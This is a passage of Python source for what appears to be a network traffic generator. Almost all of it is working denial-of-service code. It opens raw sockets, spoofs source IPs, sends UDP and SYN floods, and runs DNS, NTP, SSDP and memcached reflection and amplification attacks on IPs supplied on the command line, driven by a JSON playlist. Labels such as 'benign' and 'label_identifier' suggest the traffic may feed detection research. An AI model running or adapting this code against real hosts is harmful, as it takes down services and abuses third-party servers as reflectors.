    def generate_payload(self) -> str:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-TCPnUDP-"
        raw_payload = ''.join(random.choices(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
            k=random.randint(200, 1000)
        ))
        return prefix + raw_payload
    
    def run(self) -> None:
        logger.info("Starting UDP and TCP Flood Attack")
        num_processes = cpu_count() * 2
        processes = []
        
        for _ in range(num_processes):
            p = Process(target=self.run_process, args=(self.pause_event,))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def run_process(self, pause_event: Event) -> None:
        asyncio.run(self.run_attack(pause_event))
    
    async def run_attack(self, pause_event: Event) -> None:
        tasks = []
        num_tasks = cpu_count() * 4
        
        for _ in range(num_tasks):
            tasks.append(asyncio.create_task(self.send_packet_batch(pause_event)))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def send_packet_batch(self, pause_event: Event) -> None:
        sock_udp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock_udp.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock_tcp.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        end_time = time.time() + self.duration
        
        try:
            while time.time() < end_time:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                
                batch_size = 1000
                udp_packets = []
                tcp_packets = []
                
                for _ in range(batch_size):
                    payload = self.generate_payload()
                    target_port = self.choose_port_strategy()
                    src_port = random.randint(1024, 65535)
                    
                    for target_ip in self.target_ips:
                        udp_packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
                                     UDP(sport=src_port, dport=target_port) / \
                                     Raw(load=payload[:self.packet_factory.max_udp_payload_size])
                        udp_packets.append(bytes(udp_packet))
                        
                        tcp_packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
                                     TCP(sport=src_port, dport=target_port, flags='S', 
                                         seq=random.randint(0, 4294967295)) / \
                                     Raw(load=payload[:self.packet_factory.max_tcp_payload_size])
                        tcp_packets.append(bytes(tcp_packet))
                
                for packet in udp_packets:
                    try:
                        ip_header = packet[:20]
                        udp_header = packet[20:28]
                        dst_ip = socket.inet_ntoa(ip_header[16:20])
                        dst_port = struct.unpack('!H', udp_header[2:4])[0]
                        sock_udp.sendto(packet, (dst_ip, dst_port))
                    except OSError as e:
                        logger.error(f"Error sending UDP packet: {e}")
                
                for packet in tcp_packets:
                    try:
                        ip_header = packet[:20]
                        tcp_header = packet[20:28]
                        dst_ip = socket.inet_ntoa(ip_header[16:20])
                        dst_port = struct.unpack('!H', tcp_header[2:4])[0]
                        sock_tcp.sendto(packet, (dst_ip, dst_port))
                    except OSError as e:
                        logger.error(f"Error sending TCP packet: {e}")
        finally:
            sock_udp.close()
            sock_tcp.close()


class UDPSingleIPFlood(UDPAttack):
    """Implements a UDP Single IP Flood attack."""
    
    def __init__(self, target_ips: List[str], interface: str, duration: int, 
                 pause_event: Optional[Event] = None, min_port: Optional[int] = None, 
                 max_port: Optional[int] = None, custom_identifier: Optional[str] = None):
        super().__init__(target_ips, interface, duration, pause_event, min_port, max_port, custom_identifier)
        logger.info(f"{self.__class__.__name__} initialized with targets: {self.target_ips}")
        self.src_ips = [self.generate_random_ip() for _ in target_ips]
        self.payload = self.generate_payload("UDP_FLOOD-Single-IP-")
        self.rate = random.randint(5000, 20000)
    
    def run(self) -> None:
        logger.info("Starting UDP Single IP Flood Attack")
        num_processes = cpu_count() * 2
        processes = []
        
        for _ in range(num_processes):
            p = Process(target=self.run_process, args=(self.pause_event,))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def run_process(self, pause_event: Event) -> None:
        asyncio.run(self.run_attack(pause_event))
    
    async def run_attack(self, pause_event: Event) -> None:
        tasks = []
        num_tasks = cpu_count() * 4
        
        for _ in range(num_tasks):
            tasks.append(asyncio.create_task(self.send_packet_batch(pause_event)))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def send_packet_batch(self, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        end_time = time.time() + self.duration
        
        try:
            while time.time() < end_time:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                
                batch_size = 1000
                packets = []
                
                for _ in range(batch_size):
                    payload = self.payload
                    target_port = self.choose_port_strategy()
                    src_ip = random.choice(self.src_ips)
                    
                    udp_packet = IP(src=src_ip, dst=self.target_ips[0]) / \
                                 UDP(sport=random.randint(1024, 65535), dport=target_port) / \
                                 Raw(load=payload[:self.packet_factory.max_udp_payload_size])
                    packets.append(bytes(udp_packet))
                
                for packet in packets:
                    try:
                        ip_header = packet[:20]
                        udp_header = packet[20:28]
                        dst_ip = socket.inet_ntoa(ip_header[16:20])
                        dst_port = struct.unpack('!H', udp_header[2:4])[0]
                        sock.sendto(packet, (dst_ip, dst_port))
                    except OSError as e:
                        logger.error(f"Error sending UDP packet: {e}")
        finally:
            sock.close()


class UDPIpPacket(UDPAttack):
    """Implements a UDP IP Packet Flood attack."""
    
    def run(self) -> None:
        logger.info("Starting UDP IP Packet Flood Attack")
        num_processes = cpu_count()
        processes = []
        
        for _ in range(num_processes):
            p = Process(target=self.run_process, args=(self.pause_event,))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def send_packet_batch(self, sock: socket.socket, pause_event: Event) -> None:
        start_time = time.time()
        
        while time.time() - start_time < self.duration:
            if pause_event.is_set():
                time.sleep(1)
                continue
            
            packets = []
            for _ in range(100):
                target_port = self.choose_port_strategy()
                sport = random.randint(1024, 65535)
                payload = self.generate_payload("UDP_FLOOD-IP-Packet-")
                packet = self.packet_factory.create_udp_packet(
                    self.generate_random_ip(), self.target_ip, sport, target_port, payload
                )
                packets.append((packet, target_port))
            
            for packet, target_port in packets:
                try:
                    sock.sendto(packet, (self.target_ip, target_port))
                except OSError as e:
                    logger.error(f"Error sending packet: {e}")
                    continue
            
            time.sleep(0.001)


class UDPReflectionAttack(UDPAttack):
    """Implements a UDP Reflection Attack."""
    
    def generate_dns_query(self) -> bytes:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-dns-reflection-"
        identifier = prefix + os.urandom(4).hex()
        return identifier.encode() + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
    
    def generate_ntp_query(self) -> bytes:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-ntp-reflection-"
        identifier = prefix + os.urandom(4).hex()
        return identifier.encode() + b"\x17\x00\x03\x2a"
    
    def generate_ssdp_query(self) -> bytes:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-ssdp-reflection-"
        identifier = prefix + os.urandom(4).hex()
        return (identifier + "M-SEARCH * HTTP/1.1\r\n"
                "HOST:239.255.255.250:1900\r\n"
                "ST:upnp:rootdevice\r\n"
                "MX:2\r\n"
                "MAN:\"ssdp:discover\"\r\n\r\n").encode()
    
    def generate_reflection_query(self) -> Tuple[bytes, int]:
        service = random.choice(['DNS', 'NTP', 'SSDP'])
        if service == 'DNS':
            return self.generate_dns_query(), 53
        elif service == 'NTP':
            return self.generate_ntp_query(), 123
        elif service == 'SSDP':
            return self.generate_ssdp_query(), 1900
    
    async def send_packet_batch(self, target_ip: str, port: int, payload: bytes, 
                                rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        try:
            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
                     UDP(sport=random.randint(1024, 65535), dport=port) / \
                     Raw(load=payload)
            packet_bytes = bytes(packet)
            end_time = time.time() + self.duration
            
            while time.time() < end_time:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                    
                try:
                    for _ in range(10):
                        sock.sendto(packet_bytes, (target_ip, port))
                    await asyncio.sleep(max(1.0 / rate, 0.0001))
                except OSError as e:
                    logger.error(f"Error sending packet: {e}")
                    break
        finally:
            sock.close()
    
    async def run_attack(self) -> None:
        tasks = []
        num_tasks = cpu_count()
        
        for _ in range(num_tasks):
            rate = random.randint(5000, 20000)
            payload, port = self.generate_reflection_query()
            tasks.append(asyncio.create_task(
                self.send_packet_batch(self.target_ip, port, payload, rate, self.pause_event)
            ))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    def run(self) -> None:
        logger.info("Starting UDP Reflection Attack")
        asyncio.run(self.run_attack())


class UDPMemcachedAmplificationAttack(UDPAttack):
    """Implements a UDP Memcached Amplification Attack."""
    
    def generate_memcached_query(self) -> bytes:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-memcached-amp-"
        identifier = prefix + os.urandom(4).hex()
        command = random.choice(["stats", "get key1", "get key2", "stats slabs", "stats items"])
        return (identifier + command).encode()
    
    def run(self) -> None:
        logger.info("Starting UDP Memcached Amplification Attack")
        num_processes = cpu_count() * 2
        processes = []
        
        for _ in range(num_processes):
            p = Process(target=self.run_process, args=(self.pause_event,))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def run_process(self, pause_event: Event) -> None:
        asyncio.run(self.run_attack(pause_event))
    
    async def run_attack(self, pause_event: Event) -> None:
        tasks = []
        num_tasks = cpu_count() * 2
        port = 11211  # Standard Memcached port
        
        for _ in range(num_tasks):
            rate = random.randint(20000, 50000)
            payload = self.generate_memcached_query()
            tasks.append(asyncio.create_task(
                self.send_packet_batch(self.target_ip, port, payload, rate, pause_event)
            ))
            
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def send_packet_batch(self, target_ip: str, port: int, payload: bytes, 
                                rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        try:
            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
                     UDP(sport=random.randint(1024, 65535), dport=port) / \
                     Raw(load=payload)
            packet_bytes = bytes(packet)
            end_time = time.time() + self.duration
            
            while time.time() < end_time:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                    
                try:
                    for _ in range(100):
                        sock.sendto(packet_bytes, (target_ip, port))
                    await asyncio.sleep(1.0 / rate)
                except OSError as e:
                    logger.error(f"Error sending packet: {e}")
                    break
        finally:
            sock.close()


class UDPHybridFlood(UDPAttack):
    """Implements a UDP Hybrid Flood attack."""
    
    def generate_raw_udp_payload(self) -> str:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-raw-udp-flood-"
        return self.generate_payload(prefix)
    
    def generate_dns_query(self) -> bytes:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-dns-hybrid-"
        identifier = prefix + os.urandom(4).hex()
        return identifier.encode() + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
    
    def generate_ntp_query(self) -> bytes:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-ntp-hybrid-"
        identifier = prefix + os.urandom(4).hex()
        return identifier.encode() + b"\x17\x00\x03\x2a"
    
    def generate_ssdp_query(self) -> bytes:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-ssdp-hybrid-"
        identifier = prefix + os.urandom(4).hex()
        return (identifier + "M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:upnp:rootdevice\r\nMX:2\r\nMAN:\"ssdp:discover\"\r\n\r\n").encode()
    
    def generate_hybrid_payload(self) -> Union[str, bytes]:
        attack_type = random.choice(['raw', 'dns_amplification', 'ntp_amplification', 'ssdp_amplification'])
        if attack_type == 'raw':
            return self.generate_raw_udp_payload()
        elif attack_type == 'dns_amplification':
            return self.generate_dns_query()
        elif attack_type == 'ntp_amplification':
            return self.generate_ntp_query()
        elif attack_type == 'ssdp_amplification':
            return self.generate_ssdp_query()
    
    def run(self) -> None:
        logger.info("Starting UDP Hybrid Flood Attack")
        num_processes = cpu_count() * 2
        processes = []
        
        for _ in range(num_processes):
            p = Process(target=self.run_process, args=(self.pause_event,))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def run_process(self, pause_event: Event) -> None:
        asyncio.run(self.run_attack(pause_event))
    
    async def run_attack(self, pause_event: Event) -> None:
        tasks = []
        num_tasks = cpu_count() * 2
        
        for _ in range(num_tasks):
            rate = random.randint(20000, 50000)
            payload = self.generate_hybrid_payload()
            port = self.choose_port_strategy()
            tasks.append(asyncio.create_task(
                self.send_packet_batch(self.target_ip, port, payload, rate, pause_event)
            ))
            
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def send_packet_batch(self, target_ip: str, port: int, payload: Union[str, bytes], 
                                rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        try:
            payload_bytes = payload if isinstance(payload, bytes) else payload.encode()
            
            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
                     UDP(sport=random.randint(1024, 65535), dport=port) / \
                     Raw(load=payload_bytes)
            packet_bytes = bytes(packet)
            end_time = time.time() + self.duration
            
            while time.time() < end_time:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                    
                try:
                    for _ in range(10):
                        sock.sendto(packet_bytes, (target_ip, port))
                    await asyncio.sleep(max(1.0 / rate, 0.0001))
                except OSError as e:
                    logger.error(f"Error sending packet: {e}")
                    break
        finally:
            sock.close()


class UDPDynamicPayloadFlood(UDPAttack):
    """Implements a UDP Dynamic Payload Flood attack."""
    
    def generate_dynamic_payload(self) -> str:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-dynamic-payload-"
        return self.generate_payload(prefix)
    
    def run(self) -> None:
        logger.info("Starting UDP Dynamic Payload Flood Attack")
        num_processes = cpu_count() * 2
        processes = []
        
        for _ in range(num_processes):
            p = Process(target=self.run_process, args=(self.pause_event,))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def run_process(self, pause_event: Event) -> None:
        asyncio.run(self.run_attack(pause_event))
    
    async def run_attack(self, pause_event: Event) -> None:
        tasks = []
        num_tasks = cpu_count() * 2
        
        for _ in range(num_tasks):
            rate = random.randint(20000, 50000)
            payload = self.generate_dynamic_payload()
            port = self.choose_port_strategy()
            tasks.append(asyncio.create_task(
                self.send_packet_batch(self.target_ip, port, payload, rate, self.pause_event)
            ))
            
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def send_packet_batch(self, target_ip: str, port: int, payload: str, 
                                rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        try:
            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
                     UDP(sport=random.randint(1024, 65535), dport=port) / \
                     Raw(load=payload)
            packet_bytes = bytes(packet)
            
            end_time = time.time() + self.duration
            
            while time.time() < end_time:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                    
                try:
                    for _ in range(100):
                        sock.sendto(packet_bytes, (target_ip, port))
                    await asyncio.sleep(1.0 / rate)
                except OSError as e:
                    logger.error(f"Error sending packet: {e}")
                    break
        finally:
            sock.close()


class UDPEncryptedPayloadFlood(UDPAttack):
    """Implements a UDP Encrypted Payload Flood attack."""
    
    def encrypt_payload(self, raw_payload: str) -> str:
        key = os.urandom(32)
        iv = os.urandom(16)
        cipher = AES.new(key, AES.MODE_CFB, iv=iv)
        encrypted_payload = iv + cipher.encrypt(raw_payload.encode('utf-8'))
        return base64.b64encode(encrypted_payload).decode('utf-8')
    
    def generate_encrypted_payload(self) -> str:
        prefix = self.custom_identifier if self.custom_identifier else "UDP_FLOOD-encrypted-udp-flood-"
        raw_payload = self.generate_payload(prefix)
        encrypted_payload = self.encrypt_payload(raw_payload)
        return prefix + encrypted_payload
    
    def run(self) -> None:
        logger.info("Starting UDP Encrypted Payload Flood Attack")
        num_processes = cpu_count() * 2
        processes = []
        
        for _ in range(num_processes):
            p = Process(target=self.run_process, args=(self.pause_event,))
            p.start()
            processes.append(p)
            
        for p in processes:
            p.join()
    
    def run_process(self, pause_event: Event) -> None:
        asyncio.run(self.run_attack(pause_event))
    
    async def run_attack(self, pause_event: Event) -> None:
        tasks = []
        num_tasks = cpu_count() * 2
        
        for _ in range(num_tasks):
            rate = random.randint(20000, 50000)
            payload = self.generate_encrypted_payload()
            port = self.choose_port_strategy()
            tasks.append(asyncio.create_task(
                self.send_packet_batch(self.target_ip, port, payload, rate, self.pause_event)
            ))
            
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def send_packet_batch(self, target_ip: str, port: int, payload: str, 
                                rate: int, pause_event: Event) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        try:
            packet = IP(src=self.generate_random_ip(), dst=target_ip) / \
                     UDP(sport=random.randint(1024, 65535), dport=port) / \
                     Raw(load=payload)
            packet_bytes = bytes(packet)
            end_time = time.time() + self.duration
            
            while time.time() < end_time:
                if pause_event.is_set():
                    await asyncio.sleep(1)
                    continue
                    
                try:
                    for _ in range(100):
                        sock.sendto(packet_bytes, (target_ip, port))
                    await asyncio.sleep(max(1.0 / rate, 0.0001))
                except OSError as e:
                    logger.error(f"Error sending packet: {e}")
                    break
        finally:
            sock.close()



def get_attack_classes() -> Dict[str, Type[Attack]]:
    """Get all available attack classes."""
    return {
        'udp_traffic': UDPTraffic,
        'tcp_traffic': TCPTraffic,
        'tcp_variable_window_syn_flood': TCPVariableWindowSYNFlood,
        'tcp_amplified_syn_flood_reflection': TCPSYNFloodReflection,
        'tcp_async_slow_syn_flood': TCPAsyncSlowSYNFlood,
        'tcp_batch_syn_flood': TCPBatchSYNFlood,
        'tcp_randomized_syn_flood': TCPRandomizedSYNFlood,
        'tcp_variable_ttl_syn_flood': TCPVariableTTLSYNFlood,
        'tcp_targeted_syn_flood_common_ports': TCPTargetedSYNFloodCommonPorts,
        'tcp_adaptive_flood': TCPAdaptiveFlood,
        'tcp_batch_flood': TCPBatchFlood,
        'tcp_variable_syn_flood': TCPVariableSynFlood,
        'tcp_max_randomized_flood': TCPMaxRandomizedFlood,
        'udp_malformed_packet': UDPMalformedPacket,
        'udp_multi_protocol_amplification_attack': UDPMultiProtocolAmplificationAttack,
        'udp_adaptive_payload_flood': UDPAdaptivePayloadFlood,
        'udp_compressed_encrypted_flood': UDPCompressedEncryptedFlood,
        'udp_max_randomized_flood': UDPMaxRandomizedFlood,
        'udp_and_tcp_flood': UDPAndTCPFlood,
        'udp_single_ip_flood': UDPSingleIPFlood,
        'udp_ip_packet': UDPIpPacket,
        'udp_reflection_attack': UDPReflectionAttack,
        'udp_memcached_amplification_attack': UDPMemcachedAmplificationAttack,
        'udp_hybrid_flood': UDPHybridFlood,
        'udp_dynamic_payload_flood': UDPDynamicPayloadFlood,
        'udp_encrypted_payload_flood': UDPEncryptedPayloadFlood,
    }


# NEW helper: Run an attack instance in a new process (used for parallel benign attacks)
def run_attack_instance(attack_class, target_ips, interface, duration, label_identifier, min_port, max_port):
    attack_instance = attack_class(
        target_ips=target_ips,
        interface=interface,
        duration=duration,
        pause_event=Event(),
        custom_identifier=label_identifier,
        min_port=min_port,
        max_port=max_port
    )
    # Mark instance as running in parallel so that traffic shaping is skipped
    attack_instance.parallel = True
    attack_instance.execute()


def main() -> None:
    """Main entry point for the traffic generator."""
    parser = argparse.ArgumentParser(description="Unified Network Traffic Generator")
    
    # Named arguments
    parser.add_argument('--playlist', type=str, required=True, 
                        help="Path to the JSON file containing the playlists.")
    parser.add_argument('--receiver-ips', type=str, required=True, 
                       help="Comma-separated list of target IP addresses")
    parser.add_argument('--interface', type=str, required=True, 
                        help="Network interface to use.")
    
    args = parser.parse_args()

    # Parse target IPs
    target_ips = [ip.strip() for ip in args.receiver_ips.split(",") if ip.strip()]
    if not target_ips:
        logger.error("No valid IPs provided in --receiver-ips.")
        sys.exit(1)

    # Load the playlist from the given JSON file
    try:
        with open(args.playlist, 'r') as file:
            playlist = json.load(file)
    except Exception as e:
        logger.error(f"Failed to load playlists file: {e}")
        sys.exit(1)
    
    # NEW: Determine playlist structure.
    # If any entry has a "classes" key, assume the JSON is in the new parallel benign format.
    if isinstance(playlist, list):
        if any("classes" in entry for entry in playlist):
            playlist_entries = playlist  # Use as is.
        else:
            # Group by class_vector as before.
            grouped_playlist = {}
            for entry in playlist:
                key = entry.get('class_vector')
                if key:
                    grouped_playlist.setdefault(key, []).append(entry)
            playlist_entries = []
            for key, entries in grouped_playlist.items():
                playlist_entries.extend(entries)
    else:
        # If not a list, assume it's already grouped.
        playlist_entries = []
        for key, entries in playlist.items():
            playlist_entries.extend(entries)
    
    attack_classes = get_attack_classes()

    # Process each entry in the playlist
    for entry in playlist_entries:
        # If the entry has a "classes" key, run those benign attacks in parallel.
        if "classes" in entry:
            benign_processes = []
            for sub_entry in entry["classes"]:
                attack_class = attack_classes.get(sub_entry["class_vector"].lower())
                if not attack_class:
                    logger.error(f"Error: Traffic type '{sub_entry['class_vector']}' is not recognized.")
                    continue
                logger.info(f"Starting parallel benign traffic generation for: {entry['name']} "
                            f"({sub_entry['class_vector']}) with duration: {sub_entry.get('duration', 10)} seconds")
                p = Process(target=run_attack_instance, args=(
                    attack_class,
                    target_ips,
                    args.interface,
                    sub_entry.get("duration", 10),
                    sub_entry.get("label_identifier"),
                    sub_entry.get("min_port", 1),
                    sub_entry.get("max_port", 65535)
                ))
                p.start()
                benign_processes.append(p)
            for p in benign_processes:
                p.join()
        else:
            # Standard single attack entry processing.
            attack_class = attack_classes.get(entry["class_vector"].lower())
            if not attack_class:
                logger.error(f"Error: Traffic type '{entry['class_vector']}' is not recognized.")
                continue
            
            logger.info(f"Starting traffic generation for: {entry['name']} "
                        f"({entry['class_vector']}) with duration: {entry.get('duration', 10)} seconds")
            
            attack_instance = attack_class(
                target_ips=target_ips,
                interface=args.interface,
                duration=entry.get("duration", 10),
                pause_event=Event(),
                custom_identifier=entry.get("label_identifier"),
                min_port=entry.get("min_port", 1),
                max_port=entry.get("max_port", 65535)
            )
            attack_instance.execute()
            
if __name__ == "__main__":
    main()